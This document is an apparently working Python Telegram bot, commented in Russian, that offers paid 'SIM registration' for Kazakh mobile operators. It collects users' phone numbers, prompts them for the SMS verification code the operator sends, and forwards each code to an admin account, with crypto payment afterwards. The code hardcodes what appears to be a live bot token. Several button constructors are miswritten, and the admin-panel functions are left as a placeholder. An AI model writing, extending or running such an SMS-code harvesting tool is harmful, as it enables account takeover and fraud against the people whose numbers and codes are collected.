import asyncio
import json
import logging
import os
import tempfile
import re
from pathlib import Path
from typing import Dict, List, Any

from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import CommandStart, Command
from aiogram.types import (
    Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ================= НАСТРОЙКИ =================
TOKEN = "8623489996:AAE5rfYaS4JbAGrso_veeFALIsLagXx74s8"
ADMIN_ID = 8209617821
PRICE_USD = 2.5
PRICE_TEXT = f"Стоимость регистрации одной SIM-карты: **{PRICE_USD}$**"

# Ссылка на оплату через CryptoBot — замени на свою
CRYPTOBOT_INVOICE_LINK = "https://t.me/CryptoBot?start=pay_ВАШ_ИНВОЙС_ИЛИ_ССЫЛКА"

DATA_FILE = Path("bot_data.json")
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

bot = Bot(token=TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)
router = Router()
dp.include_router(router)

# Глобальные данные
pending_requests: List[Dict[str, Any]] = []
users: set[int] = set()
request_counter: int = 0
data_lock = asyncio.Lock()

# ================= СОСТОЯНИЯ =================
class RegForm(StatesGroup):
    operator = State()
    phone = State()

class AdminForm(StatesGroup):
    broadcast = State()
    search = State()

# ================= JSON =================
async def load_data():
    global pending_requests, users, request_counter
    if not DATA_FILE.exists():
        await save_data()
        return

    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        pending_requests = data.get("pending_requests", [])
        users = set(data.get("users", []))
        request_counter = data.get("request_counter", 0)
        logging.info(f"Загружено {len(pending_requests)} заявок, {len(users)} пользователей")
    except Exception as e:
        logging.error(f"Ошибка загрузки: {e}")
        pending_requests = []
        users = set()
        request_counter = 0
        await save_data()

async def save_data():
    async with data_lock:
        temp_path = Path(tempfile.NamedTemporaryFile(delete=False).name)
        try:
            data = {
                "pending_requests": pending_requests,
                "users": list(users),
                "request_counter": request_counter
            }
            with open(temp_path, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
            temp_path.replace(DATA_FILE)
            logging.info("Данные сохранены в JSON")
        except Exception as e:
            logging.error(f"Ошибка сохранения: {e}")
            try:
                temp_path.unlink()
            except:
                pass

# ================= КЛАВИАТУРЫ =================
def get_main_kb() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="📞 Зарегистрировать SIM")],
            [KeyboardButton(text="💰 Цена и оплата")],
            [KeyboardButton(text="🆘 Поддержка")],
        ],
        resize_keyboard=True,
        row_width=2
    )

def get_operators_kb() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="Activ")],
            [KeyboardButton(text="Tele2")],
            [KeyboardButton(text="Altel")],
            [KeyboardButton(text="← Назад")],
        ],
        resize_keyboard=True
    )

# ================= ВАЛИДАЦИЯ НОМЕРА =================
def is_valid_kz_phone(phone: str) -> bool:
    cleaned = re.sub(r'[\s\-\(\)]', '', phone)
    if not (cleaned.startswith('+7') or cleaned.startswith('8')):
        return False
    if cleaned.startswith('+7') and len(cleaned) != 12:
        return False
    if cleaned.startswith('8') and len(cleaned) != 11:
        return False
    digits_part = cleaned[2:] if cleaned.startswith('+7') else cleaned[1:]
    return digits_part.isdigit()

# ================= ХЕНДЛЕРЫ =================
@router.message(CommandStart())
async def cmd_start(message: Message):
    users.add(message.chat.id)
    if len(users) % 5 == 0:
        await save_data()

    await message.answer(
        f"⚠️ Добро пожаловать в систему.\n"
        f"Контроль — иллюзия.\n\n"
        f"{PRICE_TEXT}\n\n"
        f"Выбери действие:",
        reply_markup=get_main_kb(),
        parse_mode="Markdown"
    )

@router.message(F.text == "💰 Цена и оплата")
async def show_price(message: Message):
    text = (
        f"{PRICE_TEXT}\n\n"
        "Оплата только через CryptoBot.\n"
        "После успешной регистрации бот пришлёт ссылку на оплату.\n"
        "При оплате укажите номер заявки."
    )
    await message.answer(text, parse_mode="Markdown", reply_markup=get_main_kb())

@router.message(F.text == "🆘 Поддержка")
async def support_handler(message: Message):
    await bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
    await bot.send_message(ADMIN_ID, f"Поддержка от @{message.from_user.username or message.chat.id}")
    await message.answer("Запрос отправлен. Жди ответа.")

@router.message(F.text == "📞 Зарегистрировать SIM")
async def start_reg(message: Message, state: FSMContext):
    await state.clear()  # Очищаем на всякий случай
    await message.answer("Выбери оператора:", reply_markup=get_operators_kb())
    await state.set_state(RegForm.operator)

@router.message(RegForm.operator, F.text.in_({"Activ", "Tele2", "Altel"}))
async def choose_operator(message: Message, state: FSMContext):
    await state.update_data(operator=message.text)
    await message.answer(
        f"Оператор: {message.text}\n\n"
        "Введи номер телефона (пример: +77001234567 или 87051234567):"
    )
    await state.set_state(RegForm.phone)

@router.message(RegForm.phone)
async def process_phone(message: Message, state: FSMContext):
    global request_counter
    phone = message.text.strip()

    if not is_valid_kz_phone(phone):
        await message.answer(
            "❌ Неверный формат номера.\n\n"
            "Правильные примеры:\n"
            "• +77001234567\n"
            "• 87051234567\n"
            "• +77471234567\n\n"
            "Попробуй ещё раз:"
        )
        return

    data = await state.get_data()
    op = data.get("operator")

    request_counter += 1
    rid = request_counter

    pending_requests.append({
        "id": rid,
        "user_id": message.chat.id,
        "username": message.from_user.username or "без ника",
        "first_name": message.from_user.first_name,
        "operator": op,
        "phone": phone,
        "status": "pending",
        "sms_code": None,
        "dialog_active": False,
        "created": int(asyncio.get_event_loop().time())
    })

    await message.answer(
        f"Заявка #{rid} отправлена.\nОжидайте решения.\n\n{PRICE_TEXT}",
        reply_markup=get_main_kb(),
        parse_mode="Markdown"
    )

    admin_text = (
        f"🆕 ЗАЯВКА #{rid}\n"
        f"👤 {message.from_user.first_name} (@{message.from_user.username or 'нет'})\n"
        f"🆔 {message.chat.id}\n"
        f"📶 {op}\n"
        f"📱 {phone}\n"
        f"💰 {PRICE_USD}$"
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Зарегистрировать", callback_data=f"reg_{rid}")],
        [InlineKeyboardButton(text="❌ Отклонить", callback_data=f"rej_{rid}")]
    ])

    await bot.send_message(ADMIN_ID, admin_text, reply_markup=kb)
    logging.info(f"Новая заявка #{rid} от {message.chat.id}")
    await state.clear()
    await save_data()

@router.message(F.text == "← Назад")
async def back_to_menu(message: Message, state: FSMContext):
    await state.clear()
    await message.answer("Главное меню", reply_markup=get_main_kb())

# ================= АДМИН ПАНЕЛЬ =================
@router.message(Command("admin"))
async def admin_panel(message: Message):
    if message.chat.id != ADMIN_ID:
        return

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Все заявки", callback_data="list_all_1")],
        [InlineKeyboardButton(text="⏳ Только новые", callback_data="list_pending_1")],
        [InlineKeyboardButton(text="🔍 Поиск по номеру", callback_data="search_phone")],
        [InlineKeyboardButton(text="🔍 Поиск по ID", callback_data="search_id")],
        [InlineKeyboardButton(text="📢 Рассылка всем", callback_data="broadcast")],
        [InlineKeyboardButton(text="⟳ Обновить панель", callback_data="admin_menu")]
    ])

    await message.answer(
        f"🛠️ АДМИН ПАНЕЛЬ\n"
        f"Цена за регистрацию: {PRICE_USD}$\n\n"
        f"Выбери действие:",
        reply_markup=kb
    )
    logging.info(f"Админ {message.chat.id} открыл панель")

# ================= CALLBACK ХЕНДЛЕРЫ =================
@router.callback_query(F.data.startswith("reg_"))
async def start_registration(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("Доступ запрещён", show_alert=True)
        return

    try:
        rid = int(callback.data.split("_")[1])
        logging.info(f"Админ нажал reg_{rid}")
    except Exception as e:
        logging.error(f"Ошибка в reg_ callback: {e}")
        await callback.answer("Ошибка в номере заявки", show_alert=True)
        return

    for req in pending_requests:
        if req["id"] == rid and req["status"] == "pending":
            req["status"] = "waiting_sms_code"
            req["dialog_active"] = True

            await callback.message.edit_text(
                callback.message.text + "\n\n🔄 Запрос кода SMS отправлен клиенту...",
                reply_markup=None
            )

            await bot.send_message(
                req["user_id"],
                "✅ Администратор начал регистрацию.\n\n"
                "Введите **код из SMS**, который пришёл на ваш номер от оператора.\n"
                "(обычно 4–6 цифр)\n\n"
                "Просто напишите его сюда:"
            )

            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton("🔄 Повторно запросить SMS", callback_data=f"resend_sms_{rid}")],
                [InlineKeyboardButton("💳 Скинуть счёт CryptoBot", callback_data=f"send_invoice_{rid}")],
                [InlineKeyboardButton("❌ Отклонить заявку", callback_data=f"rej_{rid}")]
            ])

            await bot.send_message(
                ADMIN_ID,
                f"Заявка #{rid}: ожидание кода SMS от клиента.\n"
                f"Что делаем дальше?",
                reply_markup=kb
            )

            await save_data()
            await callback.answer("Запрос кода отправлен")
            return

    await callback.answer("Заявка уже обработана или не найдена", show_alert=True)


@router.callback_query(F.data.startswith("resend_sms_"))
async def resend_sms(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("Доступ запрещён", show_alert=True)
        return

    try:
        rid = int(callback.data.split("_")[2])
        logging.info(f"Админ нажал resend_sms_{rid}")
    except:
        await callback.answer("Ошибка", show_alert=True)
        return

    for req in pending_requests:
        if req["id"] == rid and req["status"] == "waiting_sms_code":
            await bot.send_message(
                req["user_id"],
                "Повторный запрос SMS отправлен.\nЖдите новой SMS от оператора и введите код сюда."
            )

            await bot.send_message(ADMIN_ID, f"Заявка #{rid}: повторный запрос SMS отправлен клиенту.")
            await callback.answer("Повторный запрос отправлен")
            return

    await callback.answer("Заявка не в статусе ожидания", show_alert=True)


@router.callback_query(F.data.startswith("send_invoice_"))
async def send_invoice(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("Доступ запрещён", show_alert=True)
        return

    try:
        rid = int(callback.data.split("_")[2])
        logging.info(f"Админ нажал send_invoice_{rid}")
    except:
        await callback.answer("Ошибка", show_alert=True)
        return

    for req in pending_requests:
        if req["id"] == rid:
            await bot.send_message(
                req["user_id"],
                f"Оплатите регистрацию SIM-карты #{rid} ({PRICE_USD}$):\n\n"
                f"Ссылка на оплату в CryptoBot:\n{CRYPTOBOT_INVOICE_LINK}\n\n"
                "После оплаты пришлите скрин или подтверждение сюда."
            )

            await bot.send_message(ADMIN_ID, f"Заявка #{rid}: счёт CryptoBot отправлен клиенту.")
            await callback.answer("Счёт отправлен")
            return

    await callback.answer("Заявка не найдена", show_alert=True)


@router.callback_query(F.data.startswith("rej_"))
async def reject_request(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("Доступ запрещён", show_alert=True)
        return

    try:
        rid = int(callback.data.split("_")[1])
        logging.info(f"Админ нажал rej_{rid}")
    except:
        await callback.answer("Ошибка", show_alert=True)
        return

    for req in pending_requests:
        if req["id"] == rid and req["status"] in ["pending", "waiting_sms_code", "sms_received"]:
            req["status"] = "rejected"
            req["dialog_active"] = False

            await bot.send_message(req["user_id"], f"❌ Заявка #{rid} отклонена.")
            await callback.message.edit_text(callback.message.text + f"\n\n❌ Отклонено #{rid}")
            await save_data()
            await callback.answer("Заявка отклонена")
            return

    await callback.answer("Заявка уже обработана", show_alert=True)


@router.callback_query(F.data.startswith("finish_"))
async def finish_registration(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("Доступ запрещён", show_alert=True)
        return

    try:
        rid = int(callback.data.split("_")[1])
        logging.info(f"Админ нажал finish_{rid}")
    except:
        await callback.answer("Ошибка", show_alert=True)
        return

    for req in pending_requests:
        if req["id"] == rid and req["status"] in ["sms_received", "waiting_sms_code"]:
            req["status"] = "registered"
            req["dialog_active"] = False

            await bot.send_message(
                req["user_id"],
                f"🎉 SIM-карта #{rid} успешно зарегистрирована!\n"
                f"Оператор: {req['operator']}\n"
                f"Номер: {req['phone']}\n\n"
                f"Оплатите {PRICE_USD}$ по ссылке:\n"
                f"{CRYPTOBOT_INVOICE_LINK}\n\n"
                "Спасибо!"
            )

            await callback.message.edit_text(
                callback.message.text + "\n\n✅ Регистрация завершена (ожидаем оплату)"
            )

            await save_data()
            await callback.answer("Завершено")
            return

    await callback.answer("Заявка не готова к завершению", show_alert=True)


# ================= САМЫЙ ПОСЛЕДНИЙ ХЕНДЛЕР =================
@router.message()
async def catch_all_dialog(message: Message):
    logging.info(f"Получено сообщение от {message.chat.id}: {message.text}")

    if message.chat.id == ADMIN_ID:
        logging.info("Сообщение от админа — игнорируем")
        return

    for req in pending_requests:
        if req.get("user_id") == message.chat.id and req.get("dialog_active", False):
            logging.info(f"Сообщение в диалоге заявки #{req['id']}, статус: {req['status']}")
            if req["status"] == "waiting_sms_code":
                code = message.text.strip()
                if code.isdigit() and 4 <= len(code) <= 6:
                    req["sms_code"] = code
                    req["status"] = "sms_received"
                    await save_data()
                    logging.info(f"Код {code} сохранён для заявки #{req['id']}")

                    await message.reply("✅ Код принят. Администратор проверяет...")

                    kb = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton("🏁 Завершить регистрацию", callback_data=f"finish_{req['id']}")],
                        [InlineKeyboardButton("🔄 Повтор SMS", callback_data=f"resend_sms_{req['id']}")],
                        [InlineKeyboardButton("💳 Скинуть счёт", callback_data=f"send_invoice_{req['id']}")],
                        [InlineKeyboardButton("❌ Отклонить", callback_data=f"rej_{req['id']}")]
                    ])

                    await bot.send_message(
                        ADMIN_ID,
                        f"Заявка #{req['id']} — клиент ввёл код SMS: **{code}**\n"
                        f"Номер: {req['phone']}\n"
                        f"Оператор: {req['operator']}\n"
                        f"Username: @{req.get('username', 'нет')}",
                        reply_markup=kb,
                        parse_mode="Markdown"
                    )
                else:
                    await message.reply("Код должен быть из 4–6 цифр. Попробуйте ещё раз:")
                return

            # Если диалог активен, но статус другой — форвардим админу
            logging.info(f"Форвардим сообщение админу от клиента {message.chat.id}")
            await bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
            return

    logging.info("Сообщение не попало в диалог — обычный ответ")
    await message.reply("Используйте кнопки меню ↓", reply_markup=get_main_kb())

# ================= АДМИН-ПАНЕЛЬ (оставляем как было) =================
# ... (добавь сюда generate_requests_list, list_requests, search, broadcast, если они были — они не менялись)

# ================= ЗАПУСК =================
async def main():
    await load_data()
    logging.info("Бот запущен")
    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())

if __name__ == "__main__":
    asyncio.run(main())